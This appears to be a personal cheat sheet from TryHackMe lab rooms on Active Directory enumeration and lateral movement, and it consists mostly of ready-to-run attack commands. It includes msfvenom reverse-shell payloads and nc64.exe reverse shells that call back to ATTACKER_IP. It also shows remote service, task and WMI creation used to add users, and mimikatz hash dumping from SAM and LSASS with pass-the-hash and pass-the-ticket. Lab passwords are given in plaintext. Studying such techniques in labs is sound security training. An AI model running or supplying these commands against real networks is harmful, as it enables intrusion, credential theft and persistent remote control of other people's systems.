[Enumerating Active Directory](#enumerating-active-directory)

[Letaral Movement]


# Enumerating Active Directory
**net**

```bash
net user /domain
net user jeffadmin /domain
net group /domain
net group "Management Department" /domain
```

**PowerView**
```bash
# basic information about the domain
Get-NetDomain

# domain user objects
Get-NetUser
Get-NetUser | select cn

# domain group
Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member

# domain computer
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname

# fine possible local administrative access on computers
Find-LocalAdminAccess
```


# Lateral Movement
**PSEXEC**
```bash
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe

psexec.py <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:'<% tp.frontmatter["PASSWORD"] %>'@<% tp.frontmatter["RHOST"] %>
psexec.py -hashes  ntlm:ntlm <% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>
```

**WinRM**
```bash
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

**WinRM with powershell**
```bash
# create a PSCredential object:
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

# create an interactive session:
Enter-PSSession -Computername TARGET -Credential $credential
```

**Creating Services Using sc**
```bash
# Simply create a new user
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice

# Upload a service binary
## Create and upload service-binary
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o mightyllamaservice.exe
smbclient -c 'put mightyllamaservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever

## Fire up multi/handler
user@AttackBox$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit 

## Since current user cannot execute sc.exe, we should spawn a shell as lenoard.summers
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"

## Create and start a service
sc.exe \\thmiis.za.tryhackme.com create LAMMYservice-3333 binPath= "%windir%\mightyllamaservice.exe" start=auto
sc.exe \\thmiis.za.tryhackme.com start LAMMYservice-3333
```

**Creating Services Using scheduled tasks**
```bash
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s TARGET /run /TN "THMtask1" 
```

**WMI**
**First we need to create PSCredentials object && Establish WMI session**

```bash
# First we need to create PSCredentials object
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

# Establish WMI session
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

**ATTACK TYPE 1. Create Remote Process**
```bash
# Create Remote Process
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}

# Same can be done with wmic.exe(legacy)
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```

**ATTACK TYPE 2. Create Service**
```bash
# Create Service
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}

# Run the service
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stop and delete the service
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```


**ATTACK TYPE 3. Create Scheduled Tasks**
```bash
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"

# Delete scheduled tasks
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

**Installing MSI packages**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994

# Start a WMI session
PS C:\> $username = 't1_corine.waters';
PS C:\> $password = 'Korine.1994';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop

# Invoke the install method
PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

**Pass the Hash**
```bash
# Extracting NTLM hashes from local SAM: only local users
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam

# Extracting NTLM hashes from LSASS memory: local users, recently logged on domain users
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::msv

# PtH attack
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

**Pass the Ticket**
```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```
